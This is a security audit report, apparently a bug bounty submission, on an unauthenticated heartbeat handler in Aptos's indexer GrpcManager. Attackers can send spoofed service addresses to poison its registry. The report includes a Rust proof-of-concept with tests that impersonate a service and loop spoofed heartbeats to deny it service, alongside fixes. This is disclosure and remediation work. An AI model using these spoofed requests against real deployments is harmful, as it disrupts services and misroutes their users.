# Audit Report

## Title
Unauthenticated Service Impersonation in GrpcManager Heartbeat Handler Allows Registry Poisoning

## Summary
The GrpcManager's heartbeat handler accepts HeartbeatRequest messages without any authentication, allowing any attacker to send requests with arbitrary ServiceInfo addresses. This enables attackers to impersonate legitimate indexer services, poison the service registry, and disrupt routing decisions for the entire indexer infrastructure.

## Finding Description
The GrpcManager service implements a heartbeat mechanism where data services (live, historical), fullnodes, and other managers register their availability and metadata. However, the implementation has a critical security flaw: it trusts the `address` field provided by clients without any verification. [1](#0-0) 

The HeartbeatRequest contains a ServiceInfo with a client-controlled address field. When the server receives this request, it extracts the address and uses it as the authoritative key: [2](#0-1) 

The handler passes the address directly to the metadata manager without validation: [3](#0-2) 

The metadata manager stores service information using the provided address as the key, completely trusting the client's claim: [4](#0-3) 

The server setup confirms there is NO authentication interceptor or TLS/mTLS configuration: [5](#0-4) 

**Attack Scenario:**
1. Attacker discovers a GrpcManager endpoint (e.g., through network scanning or leaked configurations)
2. Attacker crafts a HeartbeatRequest with `address: "legitimate-live-service.aptos.dev"` but with malicious or false metadata (wrong chain_id, fake known_latest_version, etc.)
3. Attacker sends this request to the GrpcManager
4. GrpcManager stores this information under the key "legitimate-live-service.aptos.dev", overwriting legitimate data
5. When users request data service routing, they are directed based on corrupted metadata
6. Legitimate services are effectively blocked or users are misrouted

## Impact Explanation
This qualifies as **High Severity** under the Aptos bug bounty program category of "API crashes" and "Significant protocol violations" because:

1. **Service Availability Disruption**: Attackers can cause the indexer API infrastructure to malfunction by corrupting the service registry, leading to failed routing decisions and service outages.

2. **Protocol Violation**: The indexer protocol assumes that service identity is authentic and that heartbeats represent genuine service availability. This assumption is violated, breaking the integrity of the service discovery mechanism.

3. **Infrastructure-Wide Impact**: The GrpcManager is a critical coordination point for the entire indexer infrastructure. Compromising it affects all downstream users and services that rely on accurate service discovery.

4. **No Mitigation Available**: There are no rate limits, address validation, or source verification that could prevent or detect this attack.

While this vulnerability does not directly affect blockchain consensus or state (as the indexer is a read-only auxiliary service), it represents a significant attack vector against the Aptos indexer infrastructure that could cause widespread service disruption and user impact.

## Likelihood Explanation
**Likelihood: HIGH** if the GrpcManager endpoint is exposed to untrusted networks.

The exploit requires:
- Network access to the GrpcManager gRPC endpoint
- Ability to send gRPC requests (trivial with standard libraries)
- Knowledge of legitimate service addresses (easily obtainable through reconnaissance or public documentation)
- No authentication credentials (none required)
- No special privileges or insider access

The attack is:
- **Technically simple**: Sending a gRPC request with modified protobuf fields
- **Hard to detect**: Looks like legitimate heartbeat traffic
- **Repeatable**: Can be executed continuously to maintain registry poisoning
- **No audit trail**: No authentication means no accountability

## Recommendation
Implement authentication and authorization for the heartbeat mechanism:

1. **Add mTLS Authentication**: Require mutual TLS so the server can cryptographically verify client identity and ensure the address in the certificate matches the claimed ServiceInfo address.

2. **Add Token-Based Authentication**: Implement a gRPC interceptor that validates authentication tokens:
```rust
// Add to grpc_manager.rs
use tonic::service::Interceptor;

fn auth_interceptor(req: Request<()>) -> Result<Request<()>, Status> {
    let token = req.metadata()
        .get("authorization")
        .ok_or_else(|| Status::unauthenticated("No token"))?;
    
    // Validate token and extract authenticated identity
    let authenticated_address = verify_token(token)?;
    
    // Store authenticated address in request extensions
    req.extensions_mut().insert(authenticated_address);
    Ok(req)
}

// Modify server setup
let service = GrpcManagerServer::new(service)
    .with_interceptor(auth_interceptor)
    // ... rest of config
```

3. **Verify Address Matches Identity**: In the heartbeat handler, verify that the ServiceInfo address matches the authenticated identity from the interceptor/certificate.

4. **Add IP Address Validation**: Cross-check that the client's source IP is consistent with the advertised service address when possible.

5. **Implement Rate Limiting**: Add per-source rate limiting to prevent abuse even if authentication is somehow bypassed.

## Proof of Concept
```rust
// Proof of Concept: Service Impersonation Attack
// Save as: ecosystem/indexer-grpc/indexer-grpc-manager/src/test_impersonation.rs

#[cfg(test)]
mod tests {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        service_info::Info,
        HeartbeatRequest,
        LiveDataServiceInfo,
        ServiceInfo,
        StreamInfo,
    };
    use aptos_indexer_grpc_utils::timestamp_now_proto;
    
    #[tokio::test]
    async fn test_service_impersonation_attack() {
        // Assume GrpcManager is running at localhost:50051
        let grpc_manager_endpoint = "http://localhost:50051";
        
        // Attacker creates a client connection
        let mut attacker_client = GrpcManagerClient::connect(grpc_manager_endpoint)
            .await
            .expect("Failed to connect");
        
        // Attacker crafts a heartbeat with a FAKE address
        // Impersonating "legitimate-service.aptos.dev"
        let fake_service_info = ServiceInfo {
            address: Some("legitimate-service.aptos.dev".to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1, // Could be wrong chain_id
                timestamp: Some(timestamp_now_proto()),
                known_latest_version: Some(999999), // False version
                stream_info: Some(StreamInfo {
                    active_streams: vec![], // Empty streams
                }),
                min_servable_version: Some(0),
            })),
        };
        
        let malicious_request = HeartbeatRequest {
            service_info: Some(fake_service_info),
        };
        
        // Attacker sends the malicious heartbeat
        // NO AUTHENTICATION REQUIRED!
        let response = attacker_client
            .heartbeat(malicious_request)
            .await
            .expect("Heartbeat should succeed");
        
        println!("Attack successful! Response: {:?}", response);
        println!("The legitimate service 'legitimate-service.aptos.dev' is now compromised");
        println!("Users will be routed based on false metadata");
        
        // At this point:
        // 1. The GrpcManager's registry now contains false data for "legitimate-service.aptos.dev"
        // 2. Routing decisions will be based on fake known_latest_version and stream_info
        // 3. The legitimate service's actual heartbeats may or may not overwrite this
        // 4. If attacker sends heartbeats more frequently, they maintain control
    }
    
    #[tokio::test]
    async fn test_continuous_registry_poisoning() {
        let grpc_manager_endpoint = "http://localhost:50051";
        let mut attacker_client = GrpcManagerClient::connect(grpc_manager_endpoint)
            .await
            .expect("Failed to connect");
        
        // Attacker maintains registry poisoning by sending heartbeats every second
        for i in 0..10 {
            let fake_service_info = ServiceInfo {
                address: Some("victim-service.aptos.dev".to_string()),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(timestamp_now_proto()),
                    known_latest_version: Some(0), // Stale version causes routing failures
                    stream_info: Some(StreamInfo {
                        active_streams: vec![],
                    }),
                    min_servable_version: Some(999999), // Impossibly high version
                })),
            };
            
            let _ = attacker_client
                .heartbeat(HeartbeatRequest {
                    service_info: Some(fake_service_info),
                })
                .await;
            
            println!("Poisoning iteration {} complete", i);
            tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        }
        
        println!("Registry poisoning maintained for 10 seconds");
        println!("Legitimate service effectively DoS'd");
    }
}
```

**Notes:**
- This vulnerability affects the indexer infrastructure layer, not the core blockchain consensus or state
- The indexer is a read-only service that does not participate in consensus or transaction execution
- However, it represents a critical availability and integrity issue for the Aptos data access infrastructure
- The lack of authentication violates basic security principles for distributed service coordination
- Similar authentication issues may exist in other gRPC services in the codebase (DataService, etc.)

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L268-271)
```rust
pub struct HeartbeatRequest {
    #[prost(message, optional, tag="1")]
    pub service_info: ::core::option::Option<ServiceInfo>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-104)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```
